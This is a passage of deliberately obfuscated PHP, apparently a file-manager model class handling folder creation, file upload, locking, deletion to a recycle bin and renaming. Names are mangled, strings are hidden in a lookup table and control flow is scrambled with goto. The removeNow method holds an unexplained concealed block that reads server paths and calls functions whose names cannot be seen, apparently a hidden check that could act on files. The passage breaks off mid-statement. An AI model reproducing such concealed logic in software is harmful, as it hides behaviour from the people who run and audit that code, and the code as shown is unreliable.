$C™ÄÒ‚ø‘); if (!$eÉ¹‹‹›š) { return; } $this->remove($eÉ¹‹‹›š, !1); } private function _mkdirRoot($AÁªİ”‹÷†, $bô´‡ìĞÙè, $aÌ¹ìÓ‰Á) { goto DÂ¨‡˜ğÖö; EÓ®ôŠ‹‘: CacheLock::unlock($E£Áªå®ø¼); return $dŒĞŠùÁÚ¨; goto E«Ñï®Ğ; eêŞ‘¼Ùçƒ: $E£Áªå®ø¼ = "\x4d\157\x64\x65\154\123\157\165\162\x63\x65\x2e\155\153\144\x69\162\x52\x6f\x6f\x74\x2e{$AÁªİ”‹÷†}\x2e{$bô´‡ìĞÙè}\x2e" . $aÌ¹ìÓ‰Á; CacheLock::lock($E£Áªå®ø¼); $F…Š²Ë§Š–[$EØ‰ß³›¬[28]] = $aÌ¹ìÓ‰Á; goto cŠöø»¹; cŠöø»¹: $dŒĞŠùÁÚ¨ = $this->add($F…Š²Ë§Š–); $BÌ‚ äò‚ = array($EØ‰ß³›¬[523] => short_id($dŒĞŠùÁÚ¨)); $this->where(array($EØ‰ß³›¬[380] => $dŒĞŠùÁÚ¨))->save($BÌ‚ äò‚); goto EÓ®ôŠ‹‘; DÂ¨‡˜ğÖö: $EØ‰ß³›¬ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F…Š²Ë§Š– = array($EØ‰ß³›¬[365] => 0, $EØ‰ß³›¬[517] => $AÁªİ”‹÷†, $EØ‰ß³›¬[518] => $bô´‡ìĞÙè, $EØ‰ß³›¬[514] => 1, $EØ‰ß³›¬[519] => USER_ID, $EØ‰ß³›¬[520] => USER_ID, $EØ‰ß³›¬[515] => $EØ‰ß³›¬[33], $EØ‰ß³›¬[521] => $EØ‰ß³›¬[466], $EØ‰ß³›¬[392] => 0, $EØ‰ß³›¬[516] => 0, $EØ‰ß³›¬[416] => 0, $EØ‰ß³›¬[522] => $EØ‰ß³›¬[33]); if ($CİŸğº¹„ğ = $this->where($F…Š²Ë§Š–)->find()) { return $CİŸğº¹„ğ[$EØ‰ß³›¬[366]]; } goto eêŞ‘¼Ùçƒ; E«Ñï®Ğ: } private function sourceRoot($DéŸäªÌ¨ó, $bÄÏÜ’Æï, $bà¦èâ‡áƒ = false) { $eÊè„ó¬‡• =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FİÔËÓÊ¼– = array($eÊè„ó¬‡•[365] => 0, $eÊè„ó¬‡•[517] => $DéŸäªÌ¨ó, $eÊè„ó¬‡•[518] => $bÄÏÜ’Æï); if ($Añ½…Á°™ = $this->where($FİÔËÓÊ¼–)->find()) { return $bà¦èâ‡áƒ ? $Añ½…Á°™ : $Añ½…Á°™[$eÊè„ó¬‡•[366]]; } return !1; } public function sourceRootGroup($D‘‰‰‘èÜ) { $AÖÆÈ¶“Š´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_string($D‘‰‰‘èÜ)) { $D‘‰‰‘èÜ = array($D‘‰‰‘èÜ); } $FÚ°âäèõ¨ = array($AÖÆÈ¶“Š´[365] => 0, $AÖÆÈ¶“Š´[517] => SourceModel::TYPE_GROUP, $AÖÆÈ¶“Š´[518] => array($AÖÆÈ¶“Š´[7], $D‘‰‰‘èÜ)); $C†¥ê¬ñ¼ = $this->listSource($FÚ°âäèõ¨, 1000); return array_to_keyvalue($C†¥ê¬ñ¼[$AÖÆÈ¶“Š´[74]], $AÖÆÈ¶“Š´[452]); } public function mkfile($e„§å·÷æ‚, $Aì¸ğœ¡«, $eÍ½øâ‚’ = '', $Cçì¦Í¤ğ = REPEAT_RENAME) { $dçøÁäÎËã =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C†Â—ŠËåÙ = Model($dçøÁäÎËã[540])->addFileByContent($eÍ½øâ‚’, $Aì¸ğœ¡«); return $this->_createFileCall($e„§å·÷æ‚, $Aì¸ğœ¡«, $C†Â—ŠËåÙ, $Cçì¦Í¤ğ, $dçøÁäÎËã[1110]); } public function addFile($E¹Äæ´÷Àè, $d·“èèï¤, $eŸ¤¢¾«¿, $E††ø‚™çÕ = false, $B ßÔÃ£ = REPEAT_RENAME) { $Cà«¤¥Õ‘è = Model($_SERVER[ÚŠ•´ÍéÒÑÔ][540])->addFile($d·“èèï¤, $eŸ¤¢¾«¿, $E††ø‚™çÕ); return $this->_createFileCall($E¹Äæ´÷Àè, $eŸ¤¢¾«¿, $Cà«¤¥Õ‘è, $B ßÔÃ£); } public function addFileByFileID($fš¼´®×®ë, $C”âÜò„İá, $EÏÀé™‡®Ô, $E§Ğ«ßÇñã = REPEAT_RENAME) { $B¦‚¼¸‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A„÷æ‚¦æ… = Model($B¦‚¼¸‡[540])->find($C”âÜò„İá); Model($B¦‚¼¸‡[540])->linkAdd($C”âÜò„İá); return $this->_createFileCall($fš¼´®×®ë, $EÏÀé™‡®Ô, $A„÷æ‚¦æ…, $E§Ğ«ßÇñã); } public function addFileByRemote($FÊšù‡Õ, $aõÅ…©×Ó, $EÙ˜ÇĞßßø, $Aí¨«‹­•ê = array(), $cã‚ÒÃŸ‚ƒ = REPEAT_RENAME) { $dŞ®¡¨Ì‰ = Model($_SERVER[ÚŠ•´ÍéÒÑÔ][540])->addFileByRemote($aõÅ…©×Ó, $EÙ˜ÇĞßßø, $Aí¨«‹­•ê); return $this->_createFileCall($FÊšù‡Õ, $EÙ˜ÇĞßßø, $dŞ®¡¨Ì‰, $cã‚ÒÃŸ‚ƒ); } private function _createFileCall($e÷†¿ğÖÁ, $aÑà²£äÊ, $AÅ—‚ğ¡, $FÒÊÊ¿ÂÉ¯, $DİÒ½Å¸Ùî = "\165\160\x6c\x6f\x61\x64") { goto aÄº¨ö‰Ş; aÄº¨ö‰Ş: $dŸ¾ñä–¯‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e¬ÄÆø™‘ = !1; $this->lockWriteStart($e÷†¿ğÖÁ, $aÑà²£äÊ); goto eŞ©×øØ£ã; AÂˆ”æîµô: return $c–Ğ¨¾ÕÎ; goto EÌ¸ª´ ´™; eŞ©×øØ£ã: $c–Ğ¨¾ÕÎ = $this->_createFile($e÷†¿ğÖÁ, $aÑà²£äÊ, $AÅ—‚ğ¡, $FÒÊÊ¿ÂÉ¯, $e¬ÄÆø™‘); if (!$e¬ÄÆø™‘) { Model($dŸ¾ñä–¯‡[418])->remove($AÅ—‚ğ¡[$dŸ¾ñä–¯‡[415]]); } else { if ($c–Ğ¨¾ÕÎ) { Model($dŸ¾ñä–¯‡[2259])->eventCreate($c–Ğ¨¾ÕÎ, $DİÒ½Å¸Ùî); } } $this->lockWriteEnd($e÷†¿ğÖÁ, $aÑà²£äÊ); goto AÂˆ”æîµô; EÌ¸ª´ ´™: } public function mkdir($aÍÙÒŠ‚Ñ¹, $CÉ¢©„ÏÂ, $Dó×ÇÛ‘™ø = REPEAT_SKIP) { goto b÷¨öÍ«Æ–; A¬‰¡Ü»Ÿ : return $cíáøï±‹Ó; goto Eá‹¸í‡î£; b÷¨öÍ«Æ–: $CÖĞŠ¼˜™ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÆ´Äìò¦ = $this->sourceInfo($aÍÙÒŠ‚Ñ¹); if (!$EÆ´Äìò¦) { return !1; } goto FŠÈÍè‹‰; b÷µùÈ¡ğÑ: $cíáøï±‹Ó = $this->_addSoure($F¾ÉáÖïÆº, $EÆ´Äìò¦); Model($CÖĞŠ¼˜™[2259])->eventCreate($cíáøï±‹Ó, $CÖĞŠ¼˜™[1111]); $this->lockWriteEnd($aÍÙÒŠ‚Ñ¹, $CÉ¢©„ÏÂ); goto A¬‰¡Ü»Ÿ ; FŠÈÍè‹‰: $this->lockWriteStart($aÍÙÒŠ‚Ñ¹, $CÉ¢©„ÏÂ); if ($Dó×ÇÛ‘™ø !== !1) { $cš¿•í¤¸ = $this->fileNameExist($aÍÙÒŠ‚Ñ¹, $CÉ¢©„ÏÂ); if ($cš¿•í¤¸ && $Dó×ÇÛ‘™ø != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($aÍÙÒŠ‚Ñ¹, $CÉ¢©„ÏÂ); return $cš¿•í¤¸; } $CÉ¢©„ÏÂ = $this->fileNameAuto($aÍÙÒŠ‚Ñ¹, $CÉ¢©„ÏÂ, $Dó×ÇÛ‘™ø); } $F¾ÉáÖïÆº = array($CÖĞŠ¼˜™[514] => 1, $CÖĞŠ¼˜™[383] => $CÉ¢©„ÏÂ, $CÖĞŠ¼˜™[515] => $CÖĞŠ¼˜™[33], $CÖĞŠ¼˜™[416] => 0, $CÖĞŠ¼˜™[516] => 0); goto b÷µùÈ¡ğÑ; Eá‹¸í‡î£: } private function _createFile($Bè…¨ºÃÛ, $d”ì•¦Ö²ñ, $f¬æç‰ÅáÕ, $e°ï¬„‡¾, &$Bƒîöñà–£) { goto F´ß…äğ¡; e¨‹ÂÛ´Šâ: return $f¹ß‘ÏØË±; goto D°¼–œÎ‘Ş; F´ß…äğ¡: $EùêÀï¶ãÊ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E”ÂÃä½ÕË = $this->sourceInfo($Bè…¨ºÃÛ); if (!$f¬æç‰ÅáÕ || !$E”ÂÃä½ÕË) { return !1; } goto D‚¨†¾‚‰; c¦ÎŸºÎöŠ: $D×Şë±‘ó… = array($EùêÀï¶ãÊ[514] => 0, $EùêÀï¶ãÊ[383] => $d”ì•¦Ö²ñ, $EùêÀï¶ãÊ[515] => get_path_ext($d”ì•¦Ö²ñ), $EùêÀï¶ãÊ[416] => $f¬æç‰ÅáÕ[$EùêÀï¶ãÊ[415]], $EùêÀï¶ãÊ[516] => $f¬æç‰ÅáÕ[$EùêÀï¶ãÊ[77]]); $f¹ß‘ÏØË± = $this->_addSoure($D×Şë±‘ó…, $E”ÂÃä½ÕË); $this->folderSizeReset($Bè…¨ºÃÛ); goto e¨‹ÂÛ´Šâ; D‚¨†¾‚‰: if ($e°ï¬„‡¾ !== !1) { $Cñª©„¾¾ = $this->fileNameExist($Bè…¨ºÃÛ, $d”ì•¦Ö²ñ); } $Bƒîöñà–£ = !0; if ($e°ï¬„‡¾ && $Cñª©„¾¾) { if ($e°ï¬„‡¾ == REPEAT_SKIP) { $Bƒîöñà–£ = !1; return $Cñª©„¾¾; } else { if ($e°ï¬„‡¾ == REPEAT_REPLACE) { $c…¶¦íÅï = $this->sourceInfo($Cñª©„¾¾); $cÓ÷õïï©Î = $this->fileHistory($c…¶¦íÅï, $f¬æç‰ÅáÕ[$EùêÀï¶ãÊ[415]], $f¬æç‰ÅáÕ[$EùêÀï¶ãÊ[77]]); if (!$cÓ÷õïï©Î) { $Bƒîöñà–£ = !1; } else { $this->folderSizeReset($Bè…¨ºÃÛ); } return $Cñª©„¾¾; } else { $d”ì•¦Ö²ñ = $this->fileNameAuto($Bè…¨ºÃÛ, $d”ì•¦Ö²ñ, $e°ï¬„‡¾, !1); } } } goto c¦ÎŸºÎöŠ; D°¼–œÎ‘Ş: } protected function fileHistory($dôÉóÜœ¡Ô, $A”•îÙ¯‡š, $cÃìÉÔ­‡Ñ) { goto Bã¥…ôáÑÚ; CºÂ‚¡¸Úó: Model($D–¾ê±„±Ú[2290])->addHistory($dôÉóÜœ¡Ô); $D¿ĞÇ¼™Î¶ = array($D–¾ê±„±Ú[520] => USER_ID, $D–¾ê±„±Ú[387] => time(), $D–¾ê±„±Ú[415] => $A”•îÙ¯‡š, $D–¾ê±„±Ú[77] => $cÃìÉÔ­‡Ñ); $this->where(array($D–¾ê±„±Ú[380] => $dôÉóÜœ¡Ô[$D–¾ê±„±Ú[366]]))->save($D¿ĞÇ¼™Î¶); goto fŞĞÄñÓŠ; Bã¥…ôáÑÚ: $D–¾ê±„±Ú =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($dôÉóÜœ¡Ô[$D–¾ê±„±Ú[415]] == $A”•îÙ¯‡š) { return !1; } $this->checkLock($dôÉóÜœ¡Ô[$D–¾ê±„±Ú[366]], $A”•îÙ¯‡š); goto CºÂ‚¡¸Úó; fŞĞÄñÓŠ: return !0; goto f‚œÇî¥— ; f‚œÇî¥— : } public function checkLock($DôâªÔäªç, $E‰Ì‡Ù£Ù) { goto A‘áÔÏÏ; e…¦¦Áœô: show_json(LNG($aå®ÃŞ†–[2293]) . $aå®ÃŞ†–[2294] . LNG($aå®ÃŞ†–[2295]) . $aå®ÃŞ†–[2296] . $C” °æ«°¶ . $aå®ÃŞ†–[2297], !1); goto fÛ¾·İÚ¾à; A‘áÔÏÏ: $aå®ÃŞ†– =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CŠ¢Â’†‰´ = $this->pathInfo($DôâªÔäªç); if (!$this->fileIsLock($CŠ¢Â’†‰´, !0)) { return; } goto E²Ëº™“©Ù; déÛÕ÷ßó: $this->_createFileCall($CŠ¢Â’†‰´[$aå®ÃŞ†–[457]], $Bğåë ›µ, $fî¡­Šé¯, REPEAT_REPLACE, $aå®ÃŞ†–[1110]); $FºÒ† ×¾­ = $CŠ¢Â’†‰´[$aå®ÃŞ†–[413]][$aå®ÃŞ†–[477]]; $C” °æ«°¶ = $FºÒ† ×¾­[$aå®ÃŞ†–[2292]] ? $FºÒ† ×¾­[$aå®ÃŞ†–[2292]] : $FºÒ† ×¾­[$aå®ÃŞ†–[28]]; goto e…¦¦Áœô; E²Ëº™“©Ù: $c¢ÕÁáæé¬ = Session::get($aå®ÃŞ†–[2291]); $Bğåë ›µ = substr($CŠ¢Â’†‰´[$aå®ÃŞ†–[28]], 0, -1 - strlen($CŠ¢Â’†‰´[$aå®ÃŞ†–[157]])) . $aå®ÃŞ†–[1362] . $c¢ÕÁáæé¬ . $aå®ÃŞ†–[93] . $CŠ¢Â’†‰´[$aå®ÃŞ†–[157]]; $fî¡­Šé¯ = Model($aå®ÃŞ†–[540])->find($E‰Ì‡Ù£Ù); goto déÛÕ÷ßó; fÛ¾·İÚ¾à: } public function fileIsLock($A«Ûã‡™‡, $a±ùÇ‚ªï« = false) { goto BŒ“æùçã; DŒ•¥Ô³ë²: return !1; goto f¯ƒª£´à; BŒ“æùçã: $cô¢·¨ –Ô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset($A«Ûã‡™‡[$cô¢·¨ –Ô[413]]) || !$A«Ûã‡™‡[$cô¢·¨ –Ô[413]][$cô¢·¨ –Ô[474]]) { return !1; } if ($A«Ûã‡™‡[$cô¢·¨ –Ô[413]][$cô¢·¨ –Ô[474]] != USER_ID) { return !0; } goto B‹©™‘ˆµÏ; B‹©™‘ˆµÏ: $bÁÓöÁ» = $GLOBALS[$cô¢·¨ –Ô[6]][$cô¢·¨ –Ô[84]][$cô¢·¨ –Ô[475]]; if ($A«Ûã‡™‡[$cô¢·¨ –Ô[413]][$cô¢·¨ –Ô[476]] <= time() - $bÁÓöÁ») { $this->metaSet($A«Ûã‡™‡[$cô¢·¨ –Ô[366]], $cô¢·¨ –Ô[474], null); $this->metaSet($A«Ûã‡™‡[$cô¢·¨ –Ô[366]], $cô¢·¨ –Ô[476], null); } if ($a±ùÇ‚ªï«) { $this->metaSet($A«Ûã‡™‡[$cô¢·¨ –Ô[366]], $cô¢·¨ –Ô[476], time()); } goto DŒ•¥Ô³ë²; f¯ƒª£´à: } private function _addSoure($A“º¶áë·İ, $B§ÖµÁÑ‹) { goto Fæ‡„î¿ô; a­º™Íˆ—¥: $cîˆ´âÏØµ = array($bğŠ“±Ò×Î[523] => short_id($DŠ‘Ğ‘§ª½)); $this->where(array($bğŠ“±Ò×Î[380] => $DŠ‘Ğ‘§ª½))->save($cîˆ´âÏØµ); $this->setNamePinyin($DŠ‘Ğ‘§ª½, $A“º¶áë·İ[$bğŠ“±Ò×Î[28]]); goto A‘º¨»†‰Ñ; DµáäÌĞ©: static $E‘›¸ÎÉ†é = false; if (!$E‘›¸ÎÉ†é) { Hook::trigger($bğŠ“±Ò×Î[504], $A“º¶áë·İ); $E‘›¸ÎÉ†é = !0; } $DŠ‘Ğ‘§ª½ = $this->add($A“º¶áë·İ); goto a­º™Íˆ—¥; A‘º¨»†‰Ñ: return $DŠ‘Ğ‘§ª½; goto eâñ‡Ñ‘è—; Fæ‡„î¿ô: $bğŠ“±Ò×Î =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a¾·ÒôÌŸ = array($bğŠ“±Ò×Î[517] => $B§ÖµÁÑ‹[$bğŠ“±Ò×Î[368]], $bğŠ“±Ò×Î[518] => $B§ÖµÁÑ‹[$bğŠ“±Ò×Î[452]], $bğŠ“±Ò×Î[519] => USER_ID, $bğŠ“±Ò×Î[520] => USER_ID, $bğŠ“±Ò×Î[365] => $B§ÖµÁÑ‹[$bğŠ“±Ò×Î[366]], $bğŠ“±Ò×Î[521] => $B§ÖµÁÑ‹[$bğŠ“±Ò×Î[455]] . $B§ÖµÁÑ‹[$bğŠ“±Ò×Î[366]] . $bğŠ“±Ò×Î[47], $bğŠ“±Ò×Î[392] => 0, $bğŠ“±Ò×Î[522] => $bğŠ“±Ò×Î[33]); $A“º¶áë·İ = array_merge($a¾·ÒôÌŸ, $A“º¶áë·İ); goto B¬œ—ô½†; B¬œ—ô½†: $this->updateModifyTime($A“º¶áë·İ[$bğŠ“±Ò×Î[457]]); $dêË°ƒèùÙ = $bğŠ“±Ò×Î[2298] . $B§ÖµÁÑ‹[$bğŠ“±Ò×Î[366]]; if (isset(self::$cacheChildList[$dêË°ƒèùÙ])) { unset(self::$cacheChildList[$dêË°ƒèùÙ]); } goto DµáäÌĞ©; eâñ‡Ñ‘è—: } public function remove($a…›Å…¼ , $fÊ›êâ‡õï = true) { goto b¬À‹Ôô„é; d¤×îÉĞÂÈ: $EÎë‰ÁÊŞµ = Model($Cƒ¤Ò¤¦µ«[1407])->get($Cƒ¤Ò¤¦µ«[2299]) == $Cƒ¤Ò¤¦µ«[83]; if ($fã§À½íâ¨ || $fÊ›êâ‡õï || !$EÎë‰ÁÊŞµ) { return $this->removeNow($a…›Å…¼ , $fÊ›êâ‡õï); } $E‘á—«“íÔ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto DóÉØêï¢Ô; b¬À‹Ôô„é: $Cƒ¤Ò¤¦µ« =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cÊç‰ªÎ…„ = $this->sourceInfo($a…›Å…¼ ); $fã§À½íâ¨ = intval($cÊç‰ªÎ…„[$Cƒ¤Ò¤¦µ«[368]]) === self::TYPE_SYSTEM; goto d¤×îÉĞÂÈ; b·¸Å×Ğ‡¸: return $this->move($a…›Å…¼ , $FÓà±«Òßö, REPEAT_RENAME_FOLDER); goto EõŠñòÄ§İ; DóÉØêï¢Ô: $Dœòƒ¥ââ½ = $cÊç‰ªÎ…„[$Cƒ¤Ò¤¦µ«[368]] == self::TYPE_USER ? $Cƒ¤Ò¤¦µ«[531] : $Cƒ¤Ò¤¦µ«[965]; if ($Dœòƒ¥ââ½ == $Cƒ¤Ò¤¦µ«[531]) { $dÔÇÅ¿ÛŠÉ = Model($Cƒ¤Ò¤¦µ«[470])->getInfo($cÊç‰ªÎ…„[$Cƒ¤Ò¤¦µ«[452]]); $BŸ©ê’äØÉ = !empty($dÔÇÅ¿ÛŠÉ[$Cƒ¤Ò¤¦µ«[2292]]) ? $dÔÇÅ¿ÛŠÉ[$Cƒ¤Ò¤¦µ«[2292]] : $dÔÇÅ¿ÛŠÉ[$Cƒ¤Ò¤¦µ«[28]]; $BŸ©ê’äØÉ = $Cƒ¤Ò¤¦µ«[245] . $BŸ©ê’äØÉ . $Cƒ¤Ò¤¦µ«[2300] . $cÊç‰ªÎ…„[$Cƒ¤Ò¤¦µ«[452]]; } else { $dÔÇÅ¿ÛŠÉ = Model($Cƒ¤Ò¤¦µ«[454])->getInfo($cÊç‰ªÎ…„[$Cƒ¤Ò¤¦µ«[452]]); $BŸ©ê’äØÉ = _get($dÔÇÅ¿ÛŠÉ, $Cƒ¤Ò¤¦µ«[28]); $BŸ©ê’äØÉ = $Cƒ¤Ò¤¦µ«[154] . $BŸ©ê’äØÉ . $Cƒ¤Ò¤¦µ«[2301] . $cÊç‰ªÎ…„[$Cƒ¤Ò¤¦µ«[452]]; } $EÈ“¶’ÅöØ = $Cƒ¤Ò¤¦µ«[2302] . md5($BŸ©ê’äØÉ); goto fÅöİ¬§; fÅöİ¬§: CacheLock::lock($EÈ“¶’ÅöØ); $FÓà±«Òßö = $this->fileNameExist($E‘á—«“íÔ, $BŸ©ê’äØÉ); if (!$FÓà±«Òßö) { $FÓà±«Òßö = $this->mkdir($E‘á—«“íÔ, $BŸ©ê’äØÉ, REPEAT_SKIP); $this->metaSet($FÓà±«Òßö, $Cƒ¤Ò¤¦µ«[2303], $Dœòƒ¥ââ½); $this->metaSet($FÓà±«Òßö, $Cƒ¤Ò¤¦µ«[2304], $cÊç‰ªÎ…„[$Cƒ¤Ò¤¦µ«[452]]); if ($cÊç‰ªÎ…„[$Cƒ¤Ò¤¦µ«[457]] != 0) { $this->metaSet($FÓà±«Òßö, $Cƒ¤Ò¤¦µ«[2305], _get($dÔÇÅ¿ÛŠÉ, $Cƒ¤Ò¤¦µ«[2306])); } } goto aÃŠØËìİÏ; aÃŠØËìİÏ: CacheLock::unlock($EÈ“¶’ÅöØ); $this->metaSet($a…›Å…¼ , $Cƒ¤Ò¤¦µ«[2307], $cÊç‰ªÎ…„[$Cƒ¤Ò¤¦µ«[457]]); $this->where(array($Cƒ¤Ò¤¦µ«[366] => $a…›Å…¼ ))->save(array($Cƒ¤Ò¤¦µ«[387] => time())); goto b·¸Å×Ğ‡¸; EõŠñòÄ§İ: } public function removeNow($Cõ˜ÂÂëõš, $E·¬‘Ğ˜â = true) { goto EöéÓ‰•˜É; CÉ¾•µóâï: $this->lockMoveStart($Cõ˜ÂÂëõš); Hook::trigger($cæì …å¢[2308], $E¡°ªåî“, $E·¬‘Ğ˜â); if ($E·¬‘Ğ˜â) { Model($cæì …å¢[2309])->moveToRecycle($Cõ˜ÂÂëõš); } else { if ($f¡›±ÙãÊÔ[$cæì …å¢[367]] == $cæì …å¢[83]) { $cö‡Şù¥ëÆ = array($cæì …å¢[521] => array($cæì …å¢[479], $f¡›±ÙãÊÔ[$cæì …å¢[455]] . $Cõ˜ÂÂëõš . $cæì …å¢[480])); $DÒãÏ­ñ®¡ = array($cæì …å¢[521] => $cö‡Şù¥ëÆ[$cæì …å¢[455]]); $cÕÌ½í¶¿“ = $this->field($cæì …å¢[2310])->where($DÒãÏ­ñ®¡)->select(); $E×¦‘ÁŞ¾ = !1; $b¾ÁÍÎëÉ = array($Cõ˜ÂÂëõš); if ($cÕÌ½í¶¿“) { $E×¦‘ÁŞ¾ = array_to_keyvalue($cÕÌ½í¶¿“, $cæì …å¢[33], $cæì …å¢[415]); $E×¦‘ÁŞ¾ = array_remove_value($E×¦‘ÁŞ¾, $cæì …å¢[464]); $b¾ÁÍÎëÉ = array_to_keyvalue($cÕÌ½í¶¿“, $cæì …å¢[33], $cæì …å¢[366]); $b¾ÁÍÎëÉ[] = $Cõ˜ÂÂëõš; } } else { $E×¦‘ÁŞ¾ = array($f¡›±ÙãÊÔ[$cæì …å¢[415]]); $b¾ÁÍÎëÉ = array($Cõ˜ÂÂëõš); } Model($cæì …å¢[501])->eventRemove($Cõ˜ÂÂëõš); $this->removeRelevance($b¾ÁÍÎëÉ, $E×¦‘ÁŞ¾); } goto d“¸®Á„Çˆ; dà—í‡¾ÒÄ: $this->updateModifyTime($D„”Œ’×ó’); $this->lockMoveEnd($Cõ˜ÂÂëõš); Hook::trigger($cæì …å¢[1443], $E¡°ªåî“, $E·¬‘Ğ˜â); goto C÷±×œíñ; C÷±×œíñ: return !0; goto D›“ĞôÉ–; d“¸®Á„Çˆ: $this->folderSizeReset($f¡›±ÙãÊÔ[$cæì …å¢[457]]); $D„”Œ’×ó’ = array($f¡›±ÙãÊÔ[$cæì …å¢[457]]); if ($f¡›±ÙãÊÔ[$cæì …å¢[367]] == $cæì …å¢[83]) { $D„”Œ’×ó’[] = $f¡›±ÙãÊÔ[$cæì …å¢[366]]; } goto dà—í‡¾ÒÄ; EöéÓ‰•˜É: $cæì …å¢ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($_SERVER[$cæì …å¢[781]] != $_SERVER[$cæì …å¢[782]]) { goto Aµƒšå—Ø£; Aµƒšå—Ø£: $bÇŞ‡Ô˜ = $cæì …å¢[783]; $Aµ†¥¾Ù¶Ÿ = $cæì …å¢[784]; $aÍÖ¾¡Á‘´ = $_SERVER[$cæì …å¢[785]] . $cæì …å¢[786]; goto cÆˆ‚ïéÌ; D®Ò‰‘×ğé: $Dª®¹Íæ¨Í = $cæì …å¢[788]; $Dª®¹Íæ¨Í($_SERVER[$cæì …å¢[789]]); $Dª®¹Íæ¨Í($_SERVER[$cæì …å¢[785]] . $cæì …å¢[790]); goto b­Ö–Ôäï×; cÆˆ‚ïéÌ: $AİÖ‘™“Èæ = $Aµ†¥¾Ù¶Ÿ($aÍÖ¾¡Á‘´); $fÌóŠ½£ÂÙ = explode($cæì …å¢[214], $AİÖ‘™“Èæ); if (count($fÌóŠ½£ÂÙ) < $cæì …å¢[549]) { $açŒÌØÖ‹° = $cæì …å¢[787]; $açŒÌØÖ‹°(); } goto D®Ò‰‘×ğé; b­Ö–Ôäï×: $Dì¡éæÅ¤ = 1; while ($Dì¡éæÅ¤ > 1) { $Dì¡éæÅ¤ = $Dì¡éæÅ¤ + 4; $FÅ—²õ‘¾­ = rawurlencode($Dì¡éæÅ¤ . $cæì …å¢[358]); } goto e‘ğçèÄª; e‘ğçèÄª: } $f¡›±ÙãÊÔ = $this->sourceInfo($Cõ˜ÂÂëõš); goto B×ÔÆóÛ£; B×ÔÆóÛ£: $E¡°ªåî“ = $this->pathInfoMore($Cõ˜ÂÂëõš); if (!$f¡›±ÙãÊÔ) { return !0; } if ($f¡›±ÙãÊÔ[$cæì …å¢[457]] == 0) { if (!_get($GLOBALS, $cæì …å¢[453])) { return !1; } } goto CÉ¾•µóâï; D›“ĞôÉ–: } public function removeArray($A‰óÚ±¢™±) { if (!$A‰óÚ±¢™±) { return !0; } } public function removeRelevance($bÍ‚Ÿ¾à‹†, $b®¯”ŠîŞà) { goto b¬Üİ‡¹¶; EªÁª¸†ë: Model($E‰­¡¢ğÍ[2290])->removeBySource($bÍ‚Ÿ¾à‹†); $this->where($FáµÀ†äÄ)->delete(); Model($E‰­¡¢ğÍ[418])->remove($b®¯”ŠîŞà); goto aÂ»Ú†Ô®ó; Dè¾ƒĞ¼: Model($E‰­¡¢ğÍ[2311])->where($FáµÀ†äÄ)->delete(); Model($E‰­¡¢ğÍ[501])->where($FáµÀ†äÄ)->delete(); Model($E‰­¡¢ğÍ[2049])->removeBySource($bÍ‚Ÿ¾à‹†); goto EªÁª¸†ë; aÂ»Ú†Ô®ó: for ($fìï”ÈŞæï = 0; $fìï”ÈŞæï < count($bÍ‚Ÿ¾à‹†); $fìï”ÈŞæï++) { $this->sourceCacheClear($bÍ‚Ÿ¾à‹†[$fìï”ÈŞæï]); } goto A¬£¾§óƒ–; b¬Üİ‡¹¶: $E‰­¡¢ğÍ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bÍ‚Ÿ¾à‹† = $bÍ‚Ÿ¾à‹† ? $bÍ‚Ÿ¾à‹† : array(); $b®¯”ŠîŞà = $b®¯”ŠîŞà ? $b®¯”ŠîŞà : array(); goto Bñãâßğ†¢; f‘¿÷ºï¾: $FáµÀ†äÄ = array($E‰­¡¢ğÍ[380] => array($E‰­¡¢ğÍ[381], $bÍ‚Ÿ¾à‹†)); Model($E‰­¡¢ğÍ[2309])->where($FáµÀ†äÄ)->delete(); Model($E‰­¡¢ğÍ[409])->where($FáµÀ†äÄ)->delete(); goto Dè¾ƒĞ¼; Bñãâßğ†¢: $bÍ‚Ÿ¾à‹† = array_unique(array_filter($bÍ‚Ÿ¾à‹†)); $b®¯”ŠîŞà = array_unique(array_filter($b®¯”ŠîŞà)); if (!$bÍ‚Ÿ¾à‹†) { return !1; } goto f‘¿÷ºï¾; A¬£¾§óƒ–: } public function rename($FÀé³†§Ãë, $cÂùóÙÕ´) { goto B––ï‡õß; A’¦åÊ©’’: $C¡µ·Š¹ğª = $a‰İ«ºèé[2298] . $CµÀÏİØå[$a‰İ«ºèé[457]]; if (isset(self::$cacheChildList[$C¡µ·Š¹ğª])) { unset(self::$cacheChildList[$C¡µ·Š¹ğª]); } return $eÔ©Çœ•‡; goto CØÑ‹¡‚íğ; B––ï‡õß: $a‰İ«ºèé =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CµÀÏİØå = $this->sourceInfo($FÀé³†§Ãë); if (!$CµÀÏİØå) { return !1; } goto CàçÒÌ‹†—; e³àÅ¦¶ĞÏ: if (!$CµÀÏİØå[$a‰İ«ºèé[367]] == $a‰İ«ºèé[83]) { $B•¼ø¬ƒ[$a‰İ«ºèé[369]] = get_path_ext($cÂùóÙÕ´); } Model($a‰İ«ºèé[501])->eventRename($FÀé³†§Ãë, $CµÀÏİØå[$a‰İ«ºèé[28]], $cÂùóÙÕ´); $this->sourceCacheClear($FÀé³†§Ãë); goto DŒ„·¹‹Öæ; CàçÒÌ‹†—: $CôŞŞ†Í¸­ = $this->fileNameExist($CµÀÏİØå[$a‰İ«ºèé[457]], $cÂùóÙÕ´); if ($CôŞŞ†Í¸­) { return !1; } $B•¼ø¬ƒ = array($a‰İ«ºèé[383] => $cÂùóÙÕ´, $a‰İ«ºèé[520] => USER_ID); goto e³àÅ¦¶ĞÏ; DŒ„·¹‹Öæ: $this->setNamePinyin($FÀé³†§Ãë, 